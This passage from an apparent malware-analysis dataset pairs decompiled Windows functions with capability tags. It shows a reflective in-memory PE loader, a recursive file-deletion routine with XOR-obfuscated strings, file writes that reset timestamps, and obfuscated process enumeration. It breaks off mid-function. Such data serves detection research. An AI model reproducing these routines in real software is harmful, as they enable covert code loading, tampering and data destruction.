        "decompiled_code": "\nint32_t __cdecl fcn.00416790(int32_t lpFileName, uint lpBuffer, uint nNumberOfBytesToWrite, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint lpNumberOfBytesWritten;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t hObject;\n    \n    var_8h = 0;\n    if ((arg_14h & 3) == 0) {\n        var_10h = 1;\n    }\n    else {\n        var_10h = 4;\n    }\n    var_14h = var_10h;\n    var_ch = fcn.00416900(lpFileName);\n    if (var_ch != 0) {\n        lpFileName = var_ch;\n    }\n    hObject = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0xc0000000, 0, 0, var_14h, 0x80, 0);\n    while (hObject == -1) {\n        var_8h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if ((var_8h != 0x20) || ((arg_14h & 4) == 0)) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(10);\n        hObject = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0xc0000000, 0, 0, var_14h, 0x80, 0);\n    }\n    if (hObject != -1) {\n        fcn.00416400(&lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        if ((arg_14h & 2) != 0) {\n            (*_sym.imp.KERNEL32.dll_SetFilePointer)(hObject, 0, 0, 2);\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(hObject, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0)\n        ;\n        if (iVar1 == 0) {\n            var_8h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetEndOfFile)(hObject);\n            var_8h = 0;\n        }\n        (*_sym.imp.KERNEL32.dll_SetFileTime)(hObject, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(hObject);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    if (var_ch != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    return var_8h;\n}\n",
        "token_count": 668
    },
    "00416900": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00416900(int32_t lpSrc)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint nSize;\n    uchar *lpDst;\n    \n    lpDst = NULL;\n    if (lpSrc != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(lpSrc, 0, 0);\n        if (iVar1 != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar1 * 2 + 8);\n            lpDst = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (lpDst != NULL) {\n                puVar4 = lpDst;\n                for (iVar3 = iVar1 * 2 + 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar4 = 0;\n                    puVar4 = puVar4 + 1;\n                }\n                iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(lpSrc, lpDst, iVar1);\n                if (iVar1 == 0) {\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpDst);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    lpDst = NULL;\n                }\n            }\n        }\n    }\n    return lpDst;\n}\n",
        "token_count": 325
    },
    "004169a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004169a0(int32_t lpString2, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_58h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uint8_t var_4ch [4];\n    uchar var_48h;\n    uint var_44h;\n    uchar var_40h;\n    int32_t var_3ch;\n    int32_t hFindFile;\n    uint32_t var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t lpFileName;\n    int32_t var_ch;\n    uint32_t *lpFindFileData;\n    int32_t lpPathName;\n    \n    var_ch = 8;\n    lpFindFileData = NULL;\n    lpFileName = 0;\n    lpPathName = 0;\n    var_34h = 0x104;\n    var_28h = fcn.00416900(lpString2);\n    if (var_28h != 0) {\n        lpString2 = var_28h;\n    }\n    var_30h = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    lpPathName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    if (lpPathName != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_30h * 2 + 0xc);\n        lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (lpFileName != 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x250);\n            lpFindFileData = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            if (lpFindFileData != NULL) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpPathName, lpString2);\n                var_20h._0_1_ = 0x32;\n                var_20h._1_1_ = 0x30;\n                var_20h._2_1_ = 99;\n                var_20h._3_1_ = 0x58;\n                var_44h._0_1_ = 0x6e;\n                var_44h._1_1_ = 0x30;\n                var_44h._2_1_ = 99;\n                var_44h._3_1_ = 0x58;\n                var_40h = 0x4e;\n                fcn.004012a0(8);\n                for (var_14h = 0; var_14h < 4; var_14h = var_14h + 1) {\n                    fcn.00401280(var_14h, *(&var_20h + var_14h) ^ *(&var_44h + var_14h % 5));\n                }\n                uVar1 = fcn.00401270();\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpPathName, uVar1);\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                var_58h._0_1_ = 0x38;\n                var_58h._1_1_ = 0x43;\n                var_58h._2_1_ = 99;\n                var_58h._3_1_ = 0x79;\n                var_54h = 0x5d;\n                var_53h = 100;\n                var_52h = 0x69;\n                var_51h = 0x49;\n                var_50h = 0x79;\n                var_4fh = 0x73;\n                var_4ch[0] = 100;\n                var_4ch[1] = 0x43;\n                var_4ch[2] = 0x49;\n                var_4ch[3] = 0x79;\n                var_48h = 0x73;\n                fcn.004012a0(0x14);\n                for (var_18h = 0; var_18h < 10; var_18h = var_18h + 1) {\n                    fcn.00401280(var_18h, *(&var_58h + var_18h) ^ var_4ch[var_18h % 5]);\n                }\n                uVar1 = fcn.00401270();\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, uVar1);\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, lpFindFileData);\n                if (hFindFile == -1) {\n                    var_ch = 3;\n                    fcn.004012d0();\n                    fcn.004012d0();\n                }\n                else {\n                    var_ch = 0;\n                    do {\n                        if (*(lpFindFileData + 0xb) != 0x2e) {\n                            var_3ch = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpFindFileData + 0xb);\n                            var_2ch = var_30h + 2 + var_3ch;\n                            if (var_34h < var_2ch) {\n                                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpPathName);\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_2ch << 1);\n                                lpPathName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                                if (lpPathName == 0) {\n                                    var_ch = 8;\n                                    break;\n                                }\n                                var_34h = var_2ch;\n                                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpPathName, lpString2);\n                                uVar1 = fcn.00401270();\n                                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpPathName, uVar1);\n                            }\n                            else {\n                                *(lpPathName + 2 + var_30h * 2) = 0;\n                            }\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(lpPathName, lpFindFileData + 0xb);\n                            if ((*lpFindFileData & 0x10) == 0) {\n                                iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpPathName);\n                                if ((iVar2 == 0) && (arg_10h == 0)) {\n                                    var_ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                    break;\n                                }\n                            }\n                            else if (arg_ch != 0) {\n                                var_ch = fcn.004169a0(lpPathName, 1, arg_10h);\n                                if (var_ch != 0) break;\n                                iVar2 = (*_sym.imp.KERNEL32.dll_RemoveDirectoryW)(lpPathName);\n                                if ((iVar2 == 0) && (arg_10h == 0)) {\n                                    var_ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                    break;\n                                }\n                            }\n                        }\n                        iVar2 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, lpFindFileData);\n                    } while (iVar2 != 0);\n                    fcn.004012d0();\n                    fcn.004012d0();\n                }\n            }\n        }\n    }\n    if (lpFindFileData != NULL) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFindFileData);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    if (lpFileName != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    if (lpPathName != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpPathName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    if (var_28h != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_28h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return var_ch;\n}\n",
        "token_count": 2001
    },
    "00416db0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00416db0(int32_t arg_8h, uint32_t lpString1)\n\n{\n    int32_t iVar1;\n    uint var_23ch;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t *var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t lpString2;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_10h = 0;\n    var_24h = fcn.00416fa0(arg_8h);\n    if (var_24h == 0) {\n        var_10h = 0;\n    }\n    else {\n        var_34h = var_24h + 0x18;\n        var_2ch = var_24h + 0x78;\n        lpString2 = arg_8h;\n        var_4h = arg_8h + *var_2ch;\n        var_28h = arg_8h + *(var_4h + 0x1c);\n        var_3ch = arg_8h + *(var_4h + 0x24);\n        var_38h = arg_8h + *(var_4h + 0x20);\n        if (lpString1 >> 0x10 == 0) {\n            var_8h._0_2_ = lpString1;\n            var_1ch = *(var_4h + 0x10);\n            if (((lpString1 & 0xffff) < var_1ch) || (var_1ch + *(var_4h + 0x14) <= (lpString1 & 0xffff))) {\n                return 0;\n            }\n            var_10h = arg_8h + *(var_28h + ((lpString1 & 0xffff) - var_1ch) * 4);\n        }\n        else {\n            for (var_18h = 0; var_18h < *(var_4h + 0x18); var_18h = var_18h + 1) {\n                iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(lpString1, lpString2 + *(var_38h + var_18h * 4));\n                if (iVar1 == 0) {\n                    var_10h = lpString2 + *(var_28h + *(var_3ch + var_18h * 2) * 4);\n                }\n            }\n        }\n        if ((var_4h <= var_10h) && (var_10h < var_4h + var_2ch[1])) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_lstrcpyA)(&var_23ch, var_10h);\n            if (iVar1 == 0) {\n                var_10h = 0;\n            }\n            else {\n                var_20h = 0;\n                for (var_14h = 0; *(&var_23ch + var_14h) != '\\0'; var_14h = var_14h + 1) {\n                    if (*(&var_23ch + var_14h) == '.') {\n                        *(&var_23ch + var_14h) = 0;\n                        var_20h = &var_23ch + var_14h + 1;\n                        break;\n                    }\n                }\n                if ((var_20h != 0) && (var_30h = fcn.004174b0(&var_23ch),  var_30h != 0)) {\n                    var_10h = fcn.00416db0(var_30h, var_20h);\n                }\n            }\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 912
    },
    "00416fd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00416fd0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    iVar3 = arg_8h - *(arg_8h + arg_8h[0xf] + 0x34);\n    iVar1 = *(arg_8h + arg_8h[0xf] + 0xa0);\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        var_ch = arg_8h + iVar1;\n        if (var_ch != arg_8h) {\n            for (; var_ch[1] != 0; var_ch = var_ch + var_ch[1]) {\n                iVar1 = *var_ch;\n                var_4h = var_ch + 2;\n                var_18h = var_ch[1] - 8U >> 1;\n                while (var_18h != 0) {\n                    if (10 < *var_4h >> 0xc) {\ncode_r0x004171a3:\n                        return 0;\n                    }\n    // switch table (11 cases) at 0x4171a8\n                    switch(*(*((*var_4h >> 0xc) + 0x4171c0) * 4 + 0x4171a8)) {\n                    case 0x4170a2:\n                        *(arg_8h + (*var_4h & 0xfff) + iVar1) = *(arg_8h + (*var_4h & 0xfff) + iVar1) + iVar3;\n                        break;\n                    case 0x4170d2:\n                        *(arg_8h + (*var_4h & 0xfff) + iVar1) = *(arg_8h + (*var_4h & 0xfff) + iVar1) + iVar3;\n                        break;\n                    case 0x4170ff:\n                        *(arg_8h + (*var_4h & 0xfff) + iVar1) = *(arg_8h + (*var_4h & 0xfff) + iVar1) + (iVar3 >> 0x10);\n                        break;\n                    case 0x41713b:\n                        *(arg_8h + (*var_4h & 0xfff) + iVar1) = *(arg_8h + (*var_4h & 0xfff) + iVar1) + iVar3;\n                        break;\n                    case 0x417175:\n                        break;\n                    case 0x417177:\n                        goto code_r0x004171a3;\n                    }\n                    var_4h = var_4h + 2;\n                    var_18h = var_18h - 1;\n                }\n            }\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 708
    },
    "004171d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004171d0(uchar *arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h, uint *arg_18h)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h_00;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint lpAddress;\n    \n    var_14h = 0;\n    iVar1 = fcn.00417460(arg_8h);\n    if (iVar1 != 0) {\n        iVar1 = fcn.00416fa0(arg_8h);\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, *(iVar1 + 0x50), 0x3000, 0x40);\n        if (arg_8h_00 != NULL) {\n            iVar2 = iVar1 + 0x18 + *(iVar1 + 0x14);\n            puVar4 = arg_8h;\n            puVar5 = arg_8h_00;\n            for (iVar3 = *(iVar1 + 0x54); iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            for (var_ch = 0; var_ch < *(iVar1 + 6); var_ch = var_ch + 1) {\n                puVar4 = arg_8h + *(iVar2 + 0x14 + var_ch * 0x28);\n                puVar5 = arg_8h_00 + *(iVar2 + 0xc + var_ch * 0x28);\n                for (iVar3 = *(iVar2 + 0x10 + var_ch * 0x28); iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar5 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    puVar5 = puVar5 + 1;\n                }\n            }\n            if (arg_ch == 0) {\n                var_18h = 1;\n            }\n            else {\n                var_18h = fcn.00417330(arg_8h_00);\n            }\n            if (var_18h != 0) {\n                iVar2 = fcn.00416fd0(arg_8h_00);\n                if (iVar2 != 0) {\n                    if ((arg_ch != 0) && (arg_8h_00 + *(iVar1 + 0x28) != NULL)) {\n                        (*(arg_8h_00 + *(iVar1 + 0x28)))(arg_8h_00, arg_10h, 0);\n                    }\n                    *arg_14h = arg_8h_00;\n                    *arg_18h = *(iVar1 + 0x50);\n                    var_14h = 1;\n                }\n            }\n            if (var_14h == 0) {\n                (*_sym.imp.KERNEL32.dll_VirtualFree)(arg_8h_00, *(iVar1 + 0x50), 0x4000);\n            }\n        }\n    }\n    return var_14h;\n}\n",
        "token_count": 786
    },
    "00417330": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00417330(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint hModule;\n    uint var_10h;\n    uint32_t *var_ch;\n    uint32_t *lpProcName;\n    int32_t *var_4h;\n    \n    var_4h = arg_8h + *(arg_8h + arg_8h[0xf] + 0x80);\n    if (var_4h != arg_8h) {\n        for (; var_4h[3] != 0; var_4h = var_4h + 5) {\n            iVar1 = fcn.004174b0(arg_8h + var_4h[3]);\n            if (iVar1 == 0) {\n                return 0;\n            }\n            var_ch = arg_8h + var_4h[4];\n            lpProcName = var_ch;\n            if (*var_4h != 0) {\n                lpProcName = arg_8h + *var_4h;\n            }\n            for (; *lpProcName != 0; lpProcName = lpProcName + 1) {\n                if ((*lpProcName & 0x80000000) == 0) {\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, arg_8h + *lpProcName + 2);\n                    *var_ch = uVar2;\n                }\n                else {\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, *lpProcName & 0xffff);\n                    *var_ch = uVar2;\n                }\n                if (*var_ch == 0) {\n                    return 0;\n                }\n                var_ch = var_ch + 1;\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 436
    },
    "004174b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004174b0(uint lpLibFileName)\n\n{\n    int32_t var_4h;\n    \n    var_4h = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpLibFileName);\n    if (var_4h == 0) {\n        var_4h = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName);\n    }\n    return var_4h;\n}\n",
        "token_count": 96
    },
    "00417510": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00417510(code *arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_64h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uint var_48h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uint8_t var_3ch [4];\n    uchar var_38h;\n    uint var_34h;\n    uchar var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *lpAddress;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_24h = 0xffffffff;\n    if (*0x436b08 == NULL) {\n        var_48h._0_1_ = 0x27;\n        var_48h._1_1_ = 0x1f;\n        var_48h._2_1_ = 5;\n        var_48h._3_1_ = 1;\n        var_44h = 0x3d;\n        var_43h = 0x67;\n        var_42h = 0xf;\n        var_41h = 0xd;\n        var_40h = 1;\n        var_3fh = 0x51;\n        var_34h._0_1_ = 0x49;\n        var_34h._1_1_ = 0x6b;\n        var_34h._2_1_ = 0x61;\n        var_34h._3_1_ = 0x6d;\n        var_30h = 0x51;\n        fcn.004012a0(10);\n        for (var_8h = 0; var_8h < 10; var_8h = var_8h + 1) {\n            fcn.00401280(var_8h, *(&var_48h + var_8h) ^ *(&var_34h + var_8h % 5));\n        }\n        var_64h._0_1_ = 0x21;\n        var_64h._1_1_ = 0x22;\n        var_64h._2_1_ = 0x16;\n        var_64h._3_1_ = 0x16;\n        var_60h = 6;\n        var_5fh = 0x1d;\n        var_5eh = 0x2f;\n        var_5dh = 0x14;\n        var_5ch = 0x1a;\n        var_5bh = 0x10;\n        var_5ah = 0x1b;\n        var_59h = 0x33;\n        var_58h = 0x2a;\n        var_57h = 0x2a;\n        var_56h = 0xd;\n        var_55h = 9;\n        var_54h = 0x39;\n        var_53h = 0x35;\n        var_52h = 0xe;\n        var_51h = 2;\n        var_50h = 0x1b;\n        var_4fh = 0x3f;\n        var_4eh = 0x28;\n        var_4dh = 0xd;\n        var_4ch = 99;\n        var_3ch[0] = 0x6f;\n        var_3ch[1] = 0x56;\n        var_3ch[2] = 0x47;\n        var_3ch[3] = 99;\n        var_38h = 99;\n        fcn.004012a0(0x19);\n        for (var_ch = 0; var_ch < 0x19; var_ch = var_ch + 1) {\n            fcn.00401280(var_ch, *(&var_64h + var_ch) ^ var_3ch[var_ch % 5]);\n        }\n        uVar1 = fcn.00401270();\n        uVar1 = fcn.00401270(uVar1);\n        uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(uVar1);\n        *0x436b08 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        fcn.004012d0();\n        fcn.004012d0();\n    }\n    var_10h = 0;\n    var_20h = (**0x436b08)(5, 0, 0, &var_10h);\n    if (var_20h == -0x3ffffffc) {\n        var_10h = var_10h + 0x100;\n        lpAddress = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_10h, 0x3000, 4);\n        if (lpAddress != NULL) {\n            var_20h = (**0x436b08)(5, lpAddress, var_10h, 0);\n            if (-1 < var_20h) {\n                var_4h = lpAddress;\n                var_24h = 0;\n                do {\n                    if (((var_4h[0x11] != 0) && (var_4h[0x11] != 4)) && (var_4h[0x11] != *0x436b48)) {\n                        var_28h = fcn.0041c600(var_4h[0x11], 0);\n                        var_2ch = fcn.0041e3e0(var_4h[0xf], *(var_4h + 0xe) >> 1);\n                        iVar2 = (*arg_8h)(var_4h[0xf], var_2ch, var_4h[0x11], var_4h[0x12], var_28h, arg_ch);\n                        if (iVar2 == 0) {\ncode_r0x004177ef:\n                            (*_sym.imp.KERNEL32.dll_VirtualFree)(lpAddress, 0, 0x8000);\n                            return var_24h;\n                        }\n                    }\n                    if (*var_4h == 0) goto code_r0x004177ef;\n                    var_4h = var_4h + *var_4h;\n                } while( true );\n            }\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(lpAddress, 0, 0x8000);\n        }\n    }\n    return var_24h;\n}\n",
        "token_count": 1662
    },
    "00417840": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00417840(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint var_32ch;\n    uint s;\n    int32_t var_324h;\n    uint var_314h;\n    uint var_100h;\n    int32_t var_80h;\n    int32_t var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    uint var_70h;\n    uchar var_6ch;\n    uchar var_6bh;\n    uchar var_6ah;\n    uchar var_69h;\n    uchar var_68h;\n    uchar var_67h;\n    uchar var_66h;\n    uchar var_65h;\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uchar var_61h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uint8_t var_40h [4];\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uchar var_31h;\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uchar var_2dh;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uchar var_28h;\n    uchar var_27h;\n    uint8_t var_24h [4];\n    uchar var_20h;\n    uchar var_1fh;\n    uint var_1ch;\n    uchar var_18h;\n    uint var_14h;\n    int32_t hObject;\n    uchar *pszPath;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*0x436b54 != 0) {\n        hObject = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n        var_32ch = 0;\n        sub.ntdll.dll_memset(&s, 0, 0x228);\n        var_100h._0_2_ = 0;\n        sub.ntdll.dll_memset(&var_100h + 2, 0, 0x7e);\n        var_80h = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n        pszPath = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        var_78h = 0;\n        if ((pszPath != NULL) && (hObject != -1)) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(hObject, &var_32ch);\n            if (iVar2 != 0) {\n                do {\n                    if (var_80h == var_324h) {\n                        puVar3 = pszPath;\n                        for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n                            *puVar3 = 0;\n                            puVar3 = puVar3 + 1;\n                        }\n                        fcn.00405630(var_314h, pszPath);\n                        var_40h[0] = 0x47;\n                        var_40h[1] = 0x34;\n                        var_40h[2] = 0x1d;\n                        var_40h[3] = 0x32;\n                        var_3ch = 0x2b;\n                        var_3bh = 0x4a;\n                        var_3ah = 0x42;\n                        var_39h = 0x34;\n                        var_38h = 0x11;\n                        var_37h = 0x32;\n                        var_36h = 0x3a;\n                        var_35h = 0x4a;\n                        var_34h = 0x51;\n                        var_33h = 0x34;\n                        var_32h = 0xb;\n                        var_31h = 0x32;\n                        var_30h = 0x77;\n                        